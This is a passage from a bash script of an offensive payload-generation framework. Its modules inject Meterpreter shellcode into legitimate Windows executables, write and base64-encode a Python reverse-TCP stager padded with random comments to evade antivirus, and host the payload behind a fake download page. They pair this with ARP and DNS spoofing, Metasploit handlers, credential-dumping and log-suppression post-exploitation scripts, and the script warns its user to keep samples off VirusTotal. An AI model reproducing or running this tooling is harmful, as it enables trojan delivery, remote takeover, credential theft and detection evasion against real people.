          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files .."
sleep 2
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
# cleanup avet old files ..
rm $IPATH/obfuscate/avet/template.txt > /dev/null 2>&1
rm $IPATH/obfuscate/avet/defs.h > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





#
# Shellter dynamic PE injector by: kyREcon
#
# HINT: accepts only legit executables and backdoor them with shellcode ..
# https://nodistribute.com/result/3UgXTM2Jp9 (0/39)
# https://www.virustotal.com/en/file/efe674192c87df5abce19b4ef7fa0005b7597a3de70d4ca1b34658f949d3df3e/analysis/1498501144/ (1/61)
#
sh_shellcode25 () {
# run module or abort ? 
QuE=$(zenity --question --title="☠ Shellter - dynamic PE injector ☠" --text "Author: @kyREcon\nThis module uses Shellter in order to inject shellcode into native Windows applications building trojan horses. (code cave injection)\n\nRun shellter module?" --width 320) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

#
# checking for wine install ..
#
vinho=`which wine`
if [ "$?" -eq "0" ]; then
  echo "[✔] wine installation found .."
  sleep 2
else
  echo "[x] wine installation NOT FOUND .."
  sleep 2
  sudo apt-get install wine
fi

#
# checking if shellter its installed ..
#
if [ -e "$IPATH/obfuscate/shellter/shellter.exe" ]; then
  echo "[✔] shellter installation found .."
  sleep 2
else
  echo "[x] shellter installation NOT FOUND .."
  sleep 2
fi

  #
  # config settings needed by shellter ..
  #
    echo "[☠] Enter shellcode settings!"
    cd $IPATH/obfuscate/shellter
    LhOst=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
    LpOrt=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
    appl=$(zenity --title "☠ Shellter - Chose file to be backdoored ☠" --filename=$IPATH/ --file-selection) > /dev/null 2>&1
    paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "meterpreter_reverse_tcp" FALSE "meterpreter_reverse_http" FALSE "meterpreter_reverse_https" --width 350 --height 230) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$LhOst" ]; then LhOst="$IP";fi
if [ -z "$LpOrt" ]; then LpOrt="443";fi
if [ -z "$appl" ]; then echo "${RedF}[x]${white} This Module Requires one binary.exe input";sleep 3; sh_exit;fi

   #
   # grab only the executable name from the full path
   # ^/ (search for expression) +$ (print only last espression)
   #
   echo "$appl" > test.txt
   N4m=`grep -oE '[^/]+$' test.txt` > /dev/null 2>&1
   rm test.txt > /dev/null 2>&1


    #
    # copy files generated to output folder ..
    #
    cp $appl $IPATH/obfuscate/shellter
    chown $user $N4m > /dev/null 2>&1
    echo "[✔] Files Successfully copy to shellter .."
    sleep 2


# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $LpOrt
    LHOST   : $LhOst
    PAYLOAD : $paylo
    AGENT   : $IPATH/output/$N4m

!

  #
  # in ubuntu distros we can not run shellter.exe in wine with root privs
  # so we need to run it in the context of a normal user...
  #
  su $user -c "$arch shellter.exe -a -f $N4m --stealth -p $paylo --lhost $LhOst --port $LpOrt"
  echo ""
    #
    # clean recent files ..
    #
    rm *.bak > /dev/null 2>&1
    mv $N4m $IPATH/output > /dev/null 2>&1
    #
    # config correct payload arch  ..
    #
      if [ "$paylo" = "meterpreter_reverse_tcp" ]; then
        msf_paylo="windows/meterpreter/reverse_tcp"
      elif [ "$paylo" = "meterpreter_reverse_http" ]; then
        msf_paylo="windows/meterpreter/reverse_http"
      elif [ "$paylo" = "meterpreter_reverse_https" ]; then
        msf_paylo="windows/meterpreter/reverse_https"
      else
        echo ${RedF}[x]${white} Abort module execution ..${Reset};
        sleep 2
        sh_menu
      fi

#
# CHOSE HOW TO DELIVER YOUR PAYLOAD
#
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1

  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m $ApAcHe/$N4m
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$LhOst"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
    fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files .."
sleep 2
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
cd output
rm *.ini
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}






# ------------------------------
# PYTHON - UUID+BASE64 encoding
# ------------------------------
sh_shellcode26 () {
# run module or abort ? 
QuE=$(zenity --question --title="☠ UUID random keys evasion ☠" --text "Author: r00t-3xp10it | nullbyte\nAdding ramdom comments into sourcecode\nwill help evading AVs signature detection (@nullbite)\n'a computer can never outsmart a always changing virus'\n\nRun uuid module?" --width 370) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: UuidPayload" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="UuidPayload";fi

echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
sleep 2
echo "[☠] Building shellcode -> PYTHON format .."
sleep 2
# display final settings to user
cat << !


    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PYTHON -> MULTI OS
    PAYLOAD : python/meterpreter/reverse_tcp


!


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files .."
sleep 2


#
# Template ramdom keys ..
# HINT: adding ramdom comments to source code
# will help evading AVs signature detection (nullbite) 
# "a computer can never outsmart a always changing virus" 
#
NEW_UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_6=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)


#
# Build python Template (random UUID keys)
#
cd $IPATH/output
echo "[✔] Using random UUID keys (evade signature detection)"
sleep 2
echo ""
echo "    Generated key:$NEW_UUID_1"
sleep 1
echo "    Generated key:$NEW_UUID_2"
sleep 1
echo "    Generated key:$NEW_UUID_3"
sleep 1
echo "    Generated key:$NEW_UUID_4"
sleep 1
echo "    Generated key:$NEW_UUID_5"
sleep 1
echo "    Generated key:$NEW_UUID_6"
echo ""
sleep 1


echo "[☠] build routine (template.raw) .."
sleep 2
echo "import socket,struct,time" > routine
echo "# $NEW_UUID_1" >> routine
echo "for x in range(10):" >> routine
echo "# $NEW_UUID_2" >> routine
echo "	try:" >> routine
echo "# $NEW_UUID_3" >> routine
echo "		s=socket.socket(2,socket.SOCK_STREAM)" >> routine
echo "# $NEW_UUID_4" >> routine
echo "		s.connect(('$lhost',$lport))" >> routine
echo "# $NEW_UUID_5" >> routine
echo "		break" >> routine
echo "# $NEW_UUID_6" >> routine
echo "	except:" >> routine
echo "# $NEW_UUID_1" >> routine
echo "		time.sleep(5)" >> routine
echo "# $NEW_UUID_2" >> routine
echo "l=struct.unpack('>I',s.recv(4))[0]" >> routine
echo "# $NEW_UUID_3" >> routine
echo "d=s.recv(l)" >> routine
echo "# $NEW_UUID_4" >> routine
echo "while len(d)<l:" >> routine
echo "# $NEW_UUID_5" >> routine
echo "	d+=s.recv(l-len(d))" >> routine
echo "# $NEW_UUID_6" >> routine
echo "exec(d,{'s':s})" >> routine



#
# base64 routine encoding
#
echo "[☠] base64 routine encoding .."
sleep 2
enc=`cat routine`
store=`echo "$enc" | base64 | tr -d '\n'`



#
# build template.py (final agent)
#
echo "[☠] build base64 $N4m.py agent .."
sleep 2
echo "# python  template | Author: r00t-3xp10it" > $IPATH/output/template.py
echo "# UUID obfuscation by: nullbyte" >> $IPATH/output/template.py
echo "# execute: python $N4m.py" >> $IPATH/output/template.py
echo "# ---" >> $IPATH/output/template.py
echo "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('$store')))" >> $IPATH/output/template.py



#
# make the file 'executable' ..
#
echo "[☠] make the file 'executable' .."
sleep 2
mv template.py $N4m.py > /dev/null 2>&1
chmod +x $N4m.py > /dev/null 2>&1



#
# CHOSE HOW TO DELIVER YOUR PAYLOAD
#
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.py\n\nchose how to deliver: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" --width 305 --height 360) > /dev/null 2>&1



  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi

  elif [ "$P0" = "dump_credentials_linux.rc" ]; then
    if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
      echo "[✔] wifi_dump_linux.rb -> found"
      sleep 2
    else
      echo "[x] wifi_dump_linux.rb -> not found"
      sleep 1
      echo "    copy post-module to msfdb .."
      cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

  else
    :
  fi

if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.py|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.py $ApAcHe/$N4m.py > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.py $ApAcHe/$N4m.py
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
rm $ApAcHe/$N4m.py > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
rm $IPATH/output/routine > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_multi_menu
  clear
fi
}




# ---------------------------------------------------
# SillyRAT Multi-Platforms (reverse TCP python shell)
# https://github.com/r00t-3xp10it/venom/tree/master/bin/SillyRAT
# This Module works in categorie nº3 (exe dropper) or categorie nº8 (vbs dropper)
# ---------------------------------------------------
sh_shellcode27 () {
Colors;


if [ "$vbsevasion" = "ON" ]; then
## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
echo "---"
sleep 2
fi


# ----------------- Dependencies Checks -----------------


## Make Sure all dependencies are meet (attacker)
# Check if mingw32 OR mingw-W64 GCC library exists
echo "${BlueF}[${YellowF}i${BlueF}]${white} Checking Module Dependencies.${white}";sleep 2
audit=$(which $ComP) > /dev/null 2>&1
if [ "$?" -ne "0" ]; then
   echo "${RedF}[ERROR] GCC compiler lib not found ($ComP)${white}"
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
   if [ "$ArCh" = "x64" ]; then
      echo "" && sudo apt-get update -qq && apt-get install -y mingw-w64 && echo ""
      ComP="i686-w64-mingw32-gcc" # GCC library used to compile binary
   else
